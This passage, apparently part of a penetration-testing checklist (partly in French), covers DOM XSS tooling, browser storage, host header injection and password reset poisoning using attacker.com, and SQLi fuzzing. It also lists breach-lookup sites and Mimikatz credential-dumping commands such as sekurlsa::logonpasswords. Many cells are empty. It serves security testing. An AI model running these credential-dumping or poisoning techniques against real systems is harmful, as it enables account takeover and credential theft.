</ul>
</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
</ul>
   </td>
  </tr>
  <tr>
   <td>
<ul>

<li>WSTG-CONF-03
</li>
</ul>
   </td>
  </tr>
  <tr>
   <td>
<ul>

<li>
</li>
</ul>
   </td>
  </tr>
</table>


<h3>
Client-side Testing</h3>



<table>
  <tr>
   <td>
<ul>

<li>DOM XSS 
<ul>
 
<li>Test automatique :  
<ul>
  
<li>FindomXSS :

<table>
  <tr>
   <td>
./findom-xss.sh [URL]
</li>  
</ul>
</li>  
</ul>
</li>  
</ul>
   </td>
   <td>Search sink
   </td>
  </tr>
  <tr>
   <td>
   </td>
   <td>
   </td>
  </tr>
  <tr>
   <td>
   </td>
   <td>
   </td>
  </tr>
</table>




* DOM based XSS Finder (extension CHROME) (FUZZ)

                
![alt_text](images/image430.png "image_tooltip")



                
![alt_text](images/image431.png "image_tooltip")


        * DOM Invader (en ouvrant le navigateur depuis BURP)
        * XSStrike (FUZZ)
* Test manuel :
    * Pour chaque sink trouvé, essayer d’observer si une injection est possible.
   </td>
  </tr>
  <tr>
   <td>
* 
   </td>
  </tr>
  <tr>
   <td>
* 
   </td>
  </tr>
  <tr>
   <td>
* 
   </td>
  </tr>
  <tr>
   <td>
* 
   </td>
  </tr>
</table>


<h3>
API Testing</h3>



<table>
  <tr>
   <td>
<ul>

<li>GraphQL 
<ul>
 
<li>
</li> 
</ul>
</li> 
</ul>
   </td>
  </tr>
  <tr>
   <td>
<ul>

<li>
</li>
</ul>
   </td>
  </tr>
  <tr>
   <td>
<ul>

<li>
</li>
</ul>
   </td>
  </tr>
  <tr>
   <td>
<ul>

<li>
</li>
</ul>
   </td>
  </tr>
  <tr>
   <td>
<ul>

<li>
</li>
</ul>
   </td>
  </tr>
</table>


<h3>
Testing Browser Storage</h3>



<table>
  <tr>
   <td>
<ul>

<li>Look at LocalStaraoge, Sessionstorage, IndexedDB and Cookie to determine if there are sensitive data
</li>
</ul>
   </td>
  </tr>
  <tr>
   <td>
<ul>

<li>The code handling of the storage objects should be examined for possibilities of injection attacks.
</li>
</ul>
   </td>
  </tr>
  <tr>
   <td>
<ul>

<li>
</li>
</ul>
   </td>
  </tr>
  <tr>
   <td>
<ul>

<li>
</li>
</ul>
   </td>
  </tr>
  <tr>
   <td>
<ul>

<li>
</li>
</ul>
   </td>
  </tr>
</table>


<h3>
Testing Web Messaging</h3>



<table>
  <tr>
   <td>
<ul>

<li>….
</li>
</ul>
   </td>
  </tr>
  <tr>
   <td>
<ul>

<li>…..
</li>
</ul>
   </td>
  </tr>
  <tr>
   <td>
<ul>

<li>
</li>
</ul>
   </td>
  </tr>
  <tr>
   <td>
<ul>

<li>
</li>
</ul>
   </td>
  </tr>
  <tr>
   <td>
<ul>

<li>
</li>
</ul>
   </td>
  </tr>
</table>


<h3>
Testing for Cross Site Script Inclusion</h3>



<table>
  <tr>
   <td>
<ul>

<li>….
</li>
</ul>
   </td>
  </tr>
  <tr>
   <td>
<ul>

<li>…..
</li>
</ul>
   </td>
  </tr>
  <tr>
   <td>
<ul>

<li>
</li>
</ul>
   </td>
  </tr>
  <tr>
   <td>
<ul>

<li>
</li>
</ul>
   </td>
  </tr>
  <tr>
   <td>
<ul>

<li>
</li>
</ul>
   </td>
  </tr>
</table>


<h3>
Testing for Host Header Injection</h3>


<p>

A web server commonly hosts several web applications on the same IP address, referring to each application via the virtual host. In an incoming HTTP request, web servers often dispatch the request to the target virtual host based on the value supplied in the Host header.
</p>

<table>
  <tr>
   <td>
<ul>

<li>In general, this attack is based on the situation when the Host header is being parsed and used dynamically in the application (in the code). 
    Example :
<p>

    
<img src="images/image432.png" width="" alt="alt_text" title="image_tooltip">

<p>

    
<img src="images/image433.png" width="" alt="alt_text" title="image_tooltip">

<ul>

<li>Initial testing is as simple as supplying another domain (i.e. attacker.com).
<p>

    The attack is valid when the web server processes the input to send the request to an attacker-controlled host that resides at the supplied domain, and not to an internal virtual host that resides on the web server.
<p>

    Some intercepting proxies derive the target IP address from the Host header directly, which makes this kind of testing all but impossible
</li>
</ul>
</li>
</ul>
   </td>
  </tr>
  <tr>
   <td>
<ul>

<li>X-Forwarded Host Header Bypass :
    
<img src="images/image434.png" width="" alt="alt_text" title="image_tooltip">

<p>

    X-Forwarded-Host, Forwarded, X-HTTP-Host-Override, X-Forwarded-Server, X-Host
</li>
</ul>
   </td>
  </tr>
  <tr>
   <td>
<ul>

<li>Password Reset Poisoning
    It is common for password reset functionality to include the Host header value when creating password reset links that use a generated secret token.
<p>

    If the application processes an attacker-controlled domain to create a password reset link, the victim may click on the link in the email (by providing his email) and allow the attacker to obtain the reset token, thus resetting the victim’s password.
<p>

    
<img src="images/image435.png" width="" alt="alt_text" title="image_tooltip">

</li>
</ul>
   </td>
  </tr>
  <tr>
   <td>
<ul>

<li>
</li>
</ul>
   </td>
  </tr>
  <tr>
   <td>
<ul>

<li>
</li>
</ul>
   </td>
  </tr>
</table>


<h3>
Testing for SQLi</h3>



<table>
  <tr>
   <td>
<ul>

<li>For SQL Injection Auth Bypass, test all payloads from a specific wordlist related to this situation with burp. (FUZZ)
</li>
</ul>
   </td>
  </tr>
  <tr>
   <td>
<ul>

<li>For SQL Injection in general, try Time based directly for detection, from related wordlist. (FUZZ)
</li>
</ul>
   </td>
  </tr>
  <tr>
   <td>
<ul>

<li>
</li>
</ul>
   </td>
  </tr>
  <tr>
   <td>
<ul>

<li>
</li>
</ul>
   </td>
  </tr>
  <tr>
   <td>
<ul>

<li>
</li>
</ul>
   </td>
  </tr>
</table>


<p>


</p>
<h2>Data Breach</h2>


<h3>
Search Engine</h3>


<ul>

<li>Intelligence X -<a href="https://intelx.io"> https://intelx.io</a>

<li>leakcheck -<a href="https://leakcheck.io"> https://leakcheck.io</a>

<li>weleakinfo -<a href="https://weleakinfo.to"> https://weleakinfo.to</a>

<li>leakpeek -<a href="https://leakpeek.com"> https://leakpeek.com</a>

<li>snusbase -<a href="https://snusbase.com"> https://snusbase.com</a>

<li>GlobaLeaks -<a href="https://www.globaleaks.org/"> https://www.globaleaks.org/</a>

<li>Firefox Monitor -<a href="https://monitor.firefox.com/"> https://monitor.firefox.com/</a>

<li>haveibeenpwned? -<a href="https://haveibeenpwned.com/"> https://haveibeenpwned.com/</a>

<li>ScatteredSecrets -<a href="https://scatteredsecrets.com/"> https://scatteredsecrets.com/</a>

<li>AmIBreched -<a href="https://amibreached.com"> https://amibreached.com</a>

<li>Leak Lookup -<a href="https://leak-lookup.com"> https://leak-lookup.com</a>

<li>Breach Checker -<a href="https://breachchecker.com"> https://breachchecker.com</a>

<li>RSLookup -<a href="https://rslookup.com"> https://rslookup.com</a>

<li>Breachdirectory -<a href="https://breachdirectory.org/"> https://breachdirectory.org/</a>

<li>Avast -<a href="https://www.avast.com/hackcheck"> https://www.avast.com/hackcheck</a>
<p>

 
</p>
<h2>
Windows Pentest</h2>


</li>
</ul>
<h2>Mimicatz </h2>



<table>
  <tr>
   <td>Privilege check
   </td>
   <td>privilege::debug
   </td>
  </tr>
  <tr>
   <td>Log
   </td>
   <td>log logpath.log
   </td>
  </tr>
</table>


<p>
Sekurlsa
</p>

<table>
  <tr>
   <td>
   </td>
   <td>sekurlsa::logonpasswords
   </td>
  </tr>
  <tr>
   <td>
   </td>
   <td>sekurlsa::logonPasswords full
   </td>
  </tr>
  <tr>
   <td>
   </td>
   <td>sekurlsa::tickets /export
   </td>
  </tr>
</table>


<p>
Kerberos
</p>

<table>
  <tr>
   <td>
   </td>
   <td>
   </td>
  </tr>
  <tr>
   <td>
   </td>
   <td>
   </td>
  </tr>
  <tr>
   <td>
   </td>
   <td>
   </td>
  </tr>
</table>

